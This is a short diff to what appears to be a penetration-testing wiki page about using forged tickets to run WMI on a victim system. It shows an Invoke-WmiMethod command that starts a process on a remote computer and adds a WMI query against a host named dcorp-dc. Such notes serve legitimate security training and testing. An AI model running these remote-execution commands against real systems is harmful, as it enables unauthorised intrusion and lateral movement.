@@ -42,4 +42,6 @@ With these tickets you can **execute WMI in the victim system**:
 </strong>
 # Execute code
 Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$Program"
+
+gwmi -class win32_operatingsystem -ComputerName dcorp-dc  
 </code></pre>
